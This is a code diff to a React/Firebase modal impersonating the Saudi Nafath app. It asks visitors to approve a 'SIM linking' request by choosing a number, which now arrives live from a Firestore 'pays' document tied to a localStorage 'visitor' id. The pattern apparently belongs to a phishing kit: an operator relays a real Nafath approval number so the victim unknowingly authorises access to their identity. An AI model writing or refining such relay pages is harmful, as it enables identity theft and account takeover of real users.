@@ -7,17 +7,55 @@ import { db } from "@/lib/firebase"
 interface ModalProps {
   isOpen: boolean
   onClose: () => void
-  userId: string // User ID to fetch the correct document
   phone: string
-  auth_number?:string
+  auth_number?: string
 }
 
-export default function NafazModal({ isOpen, onClose, userId, phone,auth_number }: ModalProps) {
+export default function NafazModal({ isOpen, onClose,phone, auth_number: propAuthNumber }: ModalProps) {
   const [timeLeft, setTimeLeft] = useState(60)
   const [loading, setLoading] = useState(true)
+  const [authNumber, setAuthNumber] = useState<string | null>(propAuthNumber || null)
 
   // Fetch Nafaz PIN from Firestore and listen for changes
+  useEffect(() => {
+    const  userId=localStorage.getItem("visitor")
+    if (!isOpen || !userId) {
+      setLoading(true)
+      setAuthNumber(propAuthNumber || null)
+      return
+    }
 
+    setLoading(true)
+
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", userId), // Adjust collection name as needed
+      (doc) => {
+        if (doc.exists()) {
+          const data = doc.data()
+          const fetchedAuthNumber = data?.auth_number || data?.nafaz_pin || data?.verification_code
+
+          if (fetchedAuthNumber) {
+            setAuthNumber(fetchedAuthNumber)
+          } else if (propAuthNumber) {
+            setAuthNumber(propAuthNumber)
+          }
+        } else if (propAuthNumber) {
+          setAuthNumber(propAuthNumber)
+        }
+        setLoading(false)
+      },
+      (error) => {
+        console.error("Error fetching auth number:", error)
+        // Fallback to prop value if Firestore fails
+        if (propAuthNumber) {
+          setAuthNumber(propAuthNumber)
+        }
+        setLoading(false)
+      },
+    )
+
+    return () => unsubscribe()
+  }, [isOpen,  propAuthNumber])
 
   // Timer logic
   useEffect(() => {
@@ -50,7 +88,6 @@ export default function NafazModal({ isOpen, onClose, userId, phone,auth_number 
   return (
     <div className="fixed inset-0 z-50 overflow-y-auto">
       <div className="fixed inset-0 bg-black bg-opacity-50 transition-opacity" onClick={onClose}></div>
-
       <div className="flex items-center justify-center min-h-screen px-4 py-8 sm:p-6">
         <div className="relative bg-white rounded-lg max-w-xl w-full mx-auto shadow-xl">
           <div className="p-4 sm:p-8 text-center space-y-6">
@@ -69,9 +106,16 @@ export default function NafazModal({ isOpen, onClose, userId, phone,auth_number 
 
             <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
               {loading ? (
-                <div className="animate-pulse h-8 w-16 rounded">{auth_number}</div>
+                <div className="animate-pulse">
+                  <div className="h-8 w-16 bg-gray-200 rounded"></div>
+                </div>
+              ) : authNumber ? (
+                <span className="text-4xl font-medium text-[#3a9f8c]">{authNumber}</span>
               ) : (
-                <span className="text-4xl font-medium text-[#3a9f8c]">{auth_number}</span>
+                <div className="text-center">
+                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#3a9f8c] mx-auto"></div>
+                  <span className="text-xs text-gray-500 mt-2">انتظار الرقم...</span>
+                </div>
               )}
             </div>
 
@@ -79,8 +123,8 @@ export default function NafazModal({ isOpen, onClose, userId, phone,auth_number 
               <p className="text-base sm:text-lg leading-relaxed text-gray-600">
                 الرجاء فتح تطبيق نفاذ وتأكيد طلب اصدار امر ربط شريحتك على رقم الجوال
                 <span className="mx-2 text-[#3a9f8c] font-medium">( {phone} )</span>
-                <span className="block mt-3">باختيار الرقم أعلاه</span>
-                <div className="flex items-center justify-center">
+                {authNumber && <span className="block mt-3">باختيار الرقم أعلاه</span>}
+                <div className="flex items-center justify-center mt-4">
                   <div className="bg-gray-100 rounded-lg px-4 py-2">
                     <span className="text-[#3a9f8c] font-semibold">{formatTime(timeLeft)}</span>
                   </div>
@@ -94,12 +138,11 @@ export default function NafazModal({ isOpen, onClose, userId, phone,auth_number 
                 <img src="/logo.png" alt="نفاذ" className="w-24 h-24 object-contain" />
                 <span className="text-[#3a9f8c] font-semibold text-center">تحميل تطبيق نفاذ</span>
               </div>
-
               <div className="flex flex-col items-center space-y-3">
                 <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 2</span>
                 <img src="/face-id.png" alt="التحقق من الوجه" className="w-24 h-24 object-contain" />
                 <span className="text-[#3a9f8c] text-center max-w-[200px] font-semibold">
-                  اختيار الرقم أعلاه والتحقق عبر السمات الحيوية
+                  {authNumber ? "اختيار الرقم أعلاه والتحقق عبر السمات الحيوية" : "انتظار رقم التحقق من الخادم"}
                 </span>
               </div>
             </div>
@@ -116,4 +159,3 @@ export default function NafazModal({ isOpen, onClose, userId, phone,auth_number 
     </div>
   )
 }
-
